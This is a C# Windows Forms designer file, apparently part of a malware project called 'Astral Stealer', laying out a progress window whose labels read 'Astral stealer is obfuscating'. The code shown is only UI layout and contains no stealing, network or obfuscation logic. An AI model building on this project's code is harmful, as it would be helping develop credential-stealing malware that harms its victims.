namespace Astral_Stealer
{
    partial class FormObfHelloKitty
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            Guna.UI2.WinForms.Suite.CustomizableEdges customizableEdges3 = new Guna.UI2.WinForms.Suite.CustomizableEdges();
            Guna.UI2.WinForms.Suite.CustomizableEdges customizableEdges4 = new Guna.UI2.WinForms.Suite.CustomizableEdges();
            Guna.UI2.AnimatorNS.Animation animation1 = new Guna.UI2.AnimatorNS.Animation();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormObfHelloKitty));
            Guna.UI2.WinForms.Suite.CustomizableEdges customizableEdges1 = new Guna.UI2.WinForms.Suite.CustomizableEdges();
            Guna.UI2.WinForms.Suite.CustomizableEdges customizableEdges2 = new Guna.UI2.WinForms.Suite.CustomizableEdges();
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
            label16 = new Label();
            label1 = new Label();
            guna2Transition1 = new Guna.UI2.WinForms.Guna2Transition();
            guna2ProgressBar1 = new Guna.UI2.WinForms.Guna2ProgressBar();
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox4).BeginInit();
            SuspendLayout();
            // 
            // guna2BorderlessForm1
            // 
            guna2BorderlessForm1.BorderRadius = 11;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6D;
            guna2BorderlessForm1.TransparentWhileDrag = true;
            // 
            // guna2PictureBox4
            // 
            guna2PictureBox4.BackColor = Color.Transparent;
            guna2PictureBox4.BackgroundImage = (Image)resources.GetObject("guna2PictureBox4.BackgroundImage");
            guna2PictureBox4.BackgroundImageLayout = ImageLayout.Stretch;
            guna2PictureBox4.CustomizableEdges = customizableEdges3;
            guna2Transition1.SetDecoration(guna2PictureBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            guna2PictureBox4.FillColor = Color.Transparent;
            guna2PictureBox4.ImageRotate = 0F;
            guna2PictureBox4.InitialImage = (Image)resources.GetObject("guna2PictureBox4.InitialImage");
            guna2PictureBox4.Location = new Point(404, 182);
            guna2PictureBox4.Name = "guna2PictureBox4";
            guna2PictureBox4.ShadowDecoration.CustomizableEdges = customizableEdges4;
            guna2PictureBox4.Size = new Size(133, 101);
            guna2PictureBox4.TabIndex = 31;
            guna2PictureBox4.TabStop = false;
            // 
            // label16
            // 
            label16.AutoSize = true;
            guna2Transition1.SetDecoration(label16, Guna.UI2.AnimatorNS.DecorationType.None);
            label16.Font = new Font("Arial Black", 20.25F, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 0);
            label16.ForeColor = Color.Black;
            label16.Location = new Point(53, 46);
            label16.Name = "label16";
            label16.Size = new Size(438, 38);
            label16.TabIndex = 32;
            label16.Text = "Astral stealer is obfuscating";
            // 
            // label1
            // 
            label1.AutoSize = true;
            guna2Transition1.SetDecoration(label1, Guna.UI2.AnimatorNS.DecorationType.None);
            label1.Font = new Font("Arial Black", 14.25F, FontStyle.Bold | FontStyle.Italic);
            label1.ForeColor = Color.Black;
            label1.Location = new Point(53, 80);
            label1.Name = "label1";
            label1.Size = new Size(195, 27);
            label1.TabIndex = 33;
            label1.Text = "Please be patient";
            // 
            // guna2Transition1
            // 
            guna2Transition1.Cursor = null;
            animation1.AnimateOnlyDifferences = true;
            animation1.BlindCoeff = (PointF)resources.GetObject("animation1.BlindCoeff");
            animation1.LeafCoeff = 0F;
            animation1.MaxTime = 1F;
            animation1.MinTime = 0F;
            animation1.MosaicCoeff = (PointF)resources.GetObject("animation1.MosaicCoeff");
            animation1.MosaicShift = (PointF)resources.GetObject("animation1.MosaicShift");
            animation1.MosaicSize = 0;
            animation1.Padding = new Padding(0);
            animation1.RotateCoeff = 0F;
            animation1.RotateLimit = 0F;
            animation1.ScaleCoeff = (PointF)resources.GetObject("animation1.ScaleCoeff");
            animation1.SlideCoeff = (PointF)resources.GetObject("animation1.SlideCoeff");
            animation1.TimeCoeff = 0F;
            animation1.TransparencyCoeff = 0F;
            guna2Transition1.DefaultAnimation = animation1;
            // 
            // guna2ProgressBar1
            // 
            guna2ProgressBar1.BorderRadius = 5;
            guna2ProgressBar1.CustomizableEdges = customizableEdges1;
            guna2Transition1.SetDecoration(guna2ProgressBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            guna2ProgressBar1.Location = new Point(53, 182);
            guna2ProgressBar1.Name = "guna2ProgressBar1";
            guna2ProgressBar1.ShadowDecoration.CustomizableEdges = customizableEdges2;
            guna2ProgressBar1.Size = new Size(339, 22);
            guna2ProgressBar1.TabIndex = 34;
            guna2ProgressBar1.Text = "guna2ProgressBar1";
            guna2ProgressBar1.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            // 
            // FormObfHelloKitty
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.White;
            ClientSize = new Size(539, 285);
            Controls.Add(guna2ProgressBar1);
            Controls.Add(label1);
            Controls.Add(label16);
            Controls.Add(guna2PictureBox4);
            guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            FormBorderStyle = FormBorderStyle.None;
            Name = "FormObfHelloKitty";
            Text = "FormObfHelloKitty";
            ((System.ComponentModel.ISupportInitialize)guna2PictureBox4).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
        private Guna.UI2.WinForms.Guna2PictureBox guna2PictureBox4;
        private Label label1;
        private Label label16;
        private Guna.UI2.WinForms.Guna2ProgressBar guna2ProgressBar1;
        private Guna.UI2.WinForms.Guna2Transition guna2Transition1;
    }
}